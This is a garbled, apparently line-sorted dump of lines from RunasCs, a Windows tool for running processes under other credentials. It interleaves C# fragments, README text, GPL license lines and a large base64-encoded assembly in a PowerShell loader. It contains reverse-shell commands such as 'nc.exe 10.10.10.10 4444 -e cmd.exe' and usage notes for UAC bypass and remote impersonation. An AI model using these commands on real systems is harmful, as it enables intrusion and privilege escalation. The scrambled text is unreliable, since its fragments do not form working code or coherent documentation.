"= Encoding.Default.GetString(buffer, 0, (int)dwBytesRead)"
"= String.Format(""[-]     {0}"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"""
"ALL NECESSARY SERVICING, REPAIR OR CORRECTION."
"Based on the process caller token permissions, it will use one of the create process function in the following preferred order:"
"By default, the "
"By default, the calling process ("
"Component, and (b) serves only to enable use of the work with that"
"Corresponding Source of the work from the predecessor in interest, if"
"Default"""
"Desktop: "" "
"Enabled Default"""
"For more information on this, and how to apply and follow the GNU GPL, see"
"GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE"
"GNU General Public License, you may choose any version ever published"
"HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY"
"IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF"
"If you need to spawn a background or async process, i.e. spawning a reverse shell, you need to set the parameter "
"License and any other pertinent obligations, then as a consequence you may"
"License will continue to apply to the part which is the covered work,"
"License, you may add to a covered work material governed by the terms"
"License.  Each licensee is addressed as ""you"".  ""Licensees"" and"
"Major Component, or to implement a Standard Interface for which an"
"OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,"
"Otherwise, you can try the flag "
"PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),"
"Program, unless a warranty or assumption of liability accompanies a"
"Public License ""or any later version"" applies to it, you have the"
"Public License instead of this License.  But first, please read"
"RunasCs_net2.exe"""
"System Libraries, or general-purpose tools or generally available free"
"System32"", ref startupInfo, out processInfo))"
"THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY"
"WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS"
"] Async process '"" "
"] Running in session "" "
"] Warning: LoadUserProfile failed due to insufficient permissions"")"
"] Warning: Logon for user '{0}' is limited. Use the --logon-type value '{1}' to obtain a more privileged token"", username, logonTypeNotFiltered))"
"] Warning: The function CreateProcessWithLogonW is not compatible with the requested logon type '"" "
"] Warning: The logon for user '{0}' is limited. Use the flag combination --bypass-uac and --logon-type '{1}' to obtain a more privileged token."", username, logonTypeNotFiltered))"
"] Warning: UAC Bypass is not compatible with logon type '"" "
"] Warning: User profile directory for user "" "
"a computer network, with no transfer of a copy, is not conveying."
"above cannot be given local legal effect according to their terms,"
"actual knowledge that, but for the patent license, your conveying the"
"actually uses, or expects or is expected to use, the product.  A product"
"add to a covered work, you may (if authorized by the copyright holders of"
"additional permissions on material, added by you to a covered work,"
"additional terms that apply to those files, or a notice indicating"
"admin"" -LogonType 8 -RemoteImpersonation"
"admin"" -l 8 --remote-impersonation"
"admin"""" -l 8 --remote-impersonation "
"agreement or commitment, however denominated, not to enforce a patent"
"and control, on terms that prohibit them from making any copies of"
"and which are not combined with it such as to form a larger program,"
"any patent claim is infringed by making, using, selling, offering for"
"apply only to part of the Program, that part may be used separately"
"arrangement, you convey, or propagate by procuring conveyance of, a"
"authors' sake, the GPL requires that modified versions be marked as"
"available, or (2) arrange to deprive yourself of the benefit of the"
"be similar in spirit to the present version, but may differ in detail to"
"be treated as though they were included in this License, to the extent"
"but the special requirements of the GNU Affero General Public License,"
"by this License, of making, using, or selling its contributor version,"
"certain responsibilities if you distribute copies of the software, or if"
"changed, so that their problems will not be attributed erroneously to"
"combined work, and to convey the resulting work.  The terms of this"
"commercial, industrial or non-consumer uses, unless such uses represent"
"computer or modifying a private copy.  Propagation includes copying,"
"consistent with the requirements of this License, to extend the patent"
"contain the covered work, unless you entered into that arrangement,"
"content, constitutes a covered work.  This License acknowledges your"
"control those activities.  However, it does not include the work's"
"convey, without conditions so long as your license otherwise remains"
"conveyed by you (or copies made from those copies), or (b) primarily"
"copyright holder, and you cure the violation prior to 30 days after"
"copyright on the Program, and are irrevocable provided the stated"
"covered work in a country, or your recipient's use of the covered work"
"covered work is covered by this License only if the output, given its"
"covered work, and grant a patent license to some of the parties"
"covered work, you indicate your acceptance of this License to do so."
"distribution (with or without modification), making available to the"
"earlier work or a work ""based on"" the earlier work."
"exact copy.  The resulting work is called a ""modified version"" of the"
"extent that warranties are provided), that licensees may convey the"
"feature that (1) displays an appropriate copyright notice, and (2)"
"finally terminates your license, and (b) permanently, if the copyright"
"fixed term (regardless of how the transaction is characterized), the"
"for a work that has been modified or installed by the recipient, or for"
"for making modifications to it.  ""Object code"" means any non-source"
"for you must do so exclusively on your behalf, under your direction"
"form of a separately written license, or stated as exceptions"
"free programs, and that you know you can do these things."
"freedoms that you received.  You must make sure that they, too, receive"
"from the Corresponding Source as a System Library, need not be"
"give under the previous paragraph, plus a right to possession of the"
"giving you legal permission to copy, distribute and/or modify it."
"gratis or for a fee, you must pass on to the recipients the same"
"hereafter acquired, that would be infringed by some manner, permitted"
"if any, to sign a ""copyright disclaimer"" for the program, if necessary."
"in a country, would infringe one or more identifiable patents in that"
"in a fashion requiring copyright permission, other than the making of an"
"in or on a volume of a storage or distribution medium, is called an"
"in the business of distributing software, under which you make payment"
"infringement under applicable copyright law, except executing it on a"
"interfaces specified for a particular programming language, one that"
"into a dwelling.  In determining whether a product is a consumer product,"
"into proprietary programs.  If your program is a subroutine library, you"
"license to downstream recipients.  ""Knowingly relying"" means you have"
"linked subprograms that the work is specifically designed to require,"
"machine-readable Corresponding Source under the terms of this License,"
"make it effectively proprietary.  To prevent this, the GPL assures that"
"make, use, sell, offer for sale, import and otherwise run, modify and"
"menu, a prominent item in the list meets this criterion."
"modification of the work as a means of enforcing, against the work's"
"modified object code on the User Product (for example, the work has"
"modified versions of the software inside them, although the manufacturer"
"modify it is void, and will automatically terminate your rights under"
"must place, in the relevant source files, a statement of the"
"n"", item.Key, item.Value)"
"nAdjustTokenPrivileges on privilege "" "
"nc.exe 10.10.10.10 4444 -e cmd.exe"" -t 0"
"nc.exe 10.10.10.10 4444 -e cmd.exe"""
"nc.exe 10.10.10.10 4444 -e cmd.exe"""" -t 0"
"not accept this License.  Therefore, by modifying or propagating a"
"not convey it at all.  For example, if you agree to terms that obligate you"
"not impose a license fee, royalty, or other charge for exercise of"
"of having them make modifications exclusively for you, or provide you"
"of sections 4 and 5, provided that you also convey the"
"of that license document, provided that the further restriction does"
"of the GPL, as needed to protect the freedom of users."
"or convey a specific copy of the covered work, then the patent license"
"or household purposes, or (2) anything designed or sold for incorporation"
"or that patent license was granted, prior to 28 March 2007."
"organization, or merging organizations.  If propagation of a covered"
"organization, or substantially all assets of one, or subdividing an"
"otherwise) that contradict the conditions of this License, they do not"
"owned or controlled by the contributor, whether already acquired or"
"packaging a Major Component, but which is not part of that Major"
"parties who would receive the covered work from you, a discriminatory"
"parts of the General Public License.  Of course, your program's commands"
"patent license for this particular work, or (3) arrange, in a manner"
"patent license under the contributor's essential patent claims, to"
"permission, would make you directly or secondarily liable for"
"permissions.  However, no additional obligations are imposed on any"
"possible use to the public, the best way to achieve this is to make it"
"powershell.exe"""
"private static extern bool GetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSID, uint nLength, out uint lpnLengthNeeded)"
"private static extern bool SetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSD)"
"procedures, authorization keys, or other information required to install"
"produce it from the Program, in the form of source code under the"
"produce the work, or an object code interpreter used to run it."
"product received by a particular user, ""normally used"" refers to a"
"products.  If such problems arise substantially in other domains, we"
"propagate that work, subject to this License.  You are not responsible"
"provisionally, unless and until the copyright holder explicitly and"
"public, and in some countries other activities as well."
"publicly available network server or other readily accessible means,"
"purposes of this definition, ""control"" includes the right to grant"
"receive it, in any medium, provided that you conspicuously and"
"received it, or any part of it, contains a notice stating that it is"
"receives a license from the original licensors, to run, modify and"
"receiving the covered work authorizing them to use, propagate, modify"
"reinstated, you do not qualify to receive new licenses for the same"
"remove any additional permissions from that copy, or from any part of"
"requirement to continue to provide support service, warranty, or updates"
"restriction, you may remove that term.  If a license document contains"
"restrictions"" within the meaning of section 10.  If the Program as you"
"rights granted or affirmed under this License.  For example, you may"
"rights granted under this License, and you may not initiate litigation"
"rights of fair use or other equivalent, as provided by copyright law."
"sale, or importing the Program or any portion of it."
"section 13, concerning interaction through a network will apply to the"
"software for all its users.  We, the Free Software Foundation, use the"
"software on general-purpose computers, but in those that do, we wish to"
"source code form), and must require no special password or key for"
"specifically for use in, a User Product, and the conveying occurs as"
"standard defined by a recognized standards body, or, in the case of"
"sue for patent infringement).  To ""grant"" such a patent license to a"
"tangible personal property which is normally used for personal, family,"
"terms of section 4, provided that you also meet all of these conditions:"
"than the work as a whole, that (a) is included in the normal form of"
"the ""copyright"" line and a pointer to where the full notice is found."
"the Program, the only way you could satisfy both those terms and this"
"the covered work, and you disclaim any intention to limit operation or"
"the interface presents a list of user commands or options, such as a"
"the library.  If this is what you want to do, use the GNU Lesser General"
"the scope of its coverage, prohibits the exercise of, or is"
"the source code needed to generate, install, and (for an executable"
"the work, and the source code for shared libraries and dynamically"
"the work, and under which the third party grants, to any of the"
"them if you wish), that you receive source code or can get it if you"
"these rights or asking you to surrender the rights.  Therefore, you have"
"to copy, free of charge and under the terms of this License, through a"
"to receive a copy likewise does not require acceptance.  However,"
"to take away your freedom to share and change the works.  By contrast,"
"typical or common use of that class of product, regardless of the status"
"under those permissions, but the entire Program remains governed by"
"unpacking, reading or copying."
"use, which is precisely where it is most unacceptable.  Therefore, we"
"users, your or third parties' legal rights to forbid circumvention of"
"versions of the GNU General Public License can be used, that proxy's"
"violation by some reasonable means, this is the first time you have"
"want it, that you can change the software or use pieces of it in new"
"which are not part of the work.  For example, Corresponding Source"
"with facilities for running those works, provided that you comply with"
"work results from an entity transaction, each party to that"
"work thus licensed is called the contributor's ""contributor version""."
"work under this License, and how to view a copy of this License.  If"
"work) run the object code and to modify the work, including scripts to"
"works, such as semiconductor masks."
"works, which are not by their nature extensions of the covered work,"
"your programs, too."
$Filename = (Get-Location).Path 
$base64string_x64 
$base64string_x64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))
(including a cross-claim or counterclaim in a lawsuit) alleging that
(such as an express permission to practice a patent or covenant not to
) will wait until the end of the execution of the spawned process. 
----
-----
--bypass-uac
-t timeout
. In this case 
.NET Framework >= 2.0
// call again to get the name
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aQBnAGgAdAAAACAAAABMABEAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAUgB1AG4AYQBzAEMAcwBfAG4AZQB0ADIALgBlAHgAZQAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAw
///eJCZyDR8AcBMR3YoAAAATDnJ7HwBwEQ5vBwAACigVAAAKExHecwdvYAAAChkvBnKDHwBwKgcWb2EAAAoMBxdvYQAACg0HGG9hAAAKEwQRBiwDFhMHczMAAAYTDxEPCAkRBBEFEQcRCBEJEQYRChELEQxvNQAABgreHRMQEQ9vNAAABnJ7HwBwERBvBwAACigVAAAKCt4ABioRESoAAABBTAAAAAAAAFwAAADTAQAALwIAAA0AAAAyAAABAAAAAFwAAADTAQAAPAIAABcAAAACAAACAAAAAIkCAAAeAAAApwIAAB0AAAACAAACLnIkIABwgBwBAAQqbigDAAAKAihtAAAGb1kAAAooAwAACm8EAAAKKh4CKDAAAAoqQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAABQBsAAAAWCMAACN
//8 = sizeof(ACL)
//Fully qualified account names
0ECAC8A/IECADAA/cECADEA/wECADIAwEFCADMAwYFCADQAwsFCADUAxAFCADYAxUFCADcAxoFCADgAx8FCADoAygFCADsA5QACADwA18ACAD0A9gDCAD4A90DCAD8A
0HAQg6CFkIZwhAAQsA5wQBAEABDQDzBAEAQAEPAAcFAgBAAREAHwUCAEABEwAuBQMAQAEVADsFAgBgERcASAUCAEABGQBSBQIAQAEbAGMFAgBGAR0AdAUDAEQBHwCCBQIARAEhAJoFAgBEASMArgUEAEABJQDGBQIARAEnANYFAwAAASkA4QUDAEABKwD5BQMAQAEtAAIGAwBGAS8AEgYFAEYBMQApBgUARgEzAFsGBQBGATUAcwYFAEYBNwCDBgUAQgE5AM4GBgBAATsA2AYGAEABPQDgBgYABgE/AOYGBgBGAUEA9gYGAEQBQwABBwYARAFtALcMBwBAAW8AzwwIAEQBcQDoDAcAAAFzAPoMCABEAXUABg0HAEABdwAZDQgAQAF5ACYNCAAAAXsAPg0CAEABfQBGDQgARAF/AFwNAgBEAYEAdg0CAEABgwCIDQIARAGFAKUNAgBAAYcAsg0CAEABiQDADQIAQAGLAMcNAgBAAY0Azg0CAEABjwDiDQIAQAGRAPwNCABAAZMAEg4CAEQBlQAaDgIAQAGlAAUVAgBEAacAGRUCAEABqQAFFQIAQAGrAC0VAgBAAa0ARhUCAEABrwBaFQIAQAGxAG0VAgBAAbMAhRUCAEABtQCbFQIAYBG3AEgFAgBAAbkA5wQBAOgmAAAdAQSAAAAAAAAAAAAAAAAAAAAAALwcAAACAAAAAAAAAAAAAAABAFoCAAAAAAIAAAAAAAAAAAAAAAEAYwIAAAAABAADAAUAAwAGAAMABwADAAgAAwAJAAMACgADAAsAAwANAAwADgAMAA8ADAAQAAwAEQAMABIADAATAAwAFAAMABYAFQAXABUAGAAVABkAFQAaABUAGwAVABwAFQAdABUAHgAVAB8AFQAgABUAIQAVACUAJAAAAAAAADxNb2R1bGU
<https://www.gnu.org/licenses/>.
<https://www.gnu.org/licenses/why-not-lgpl.html>.
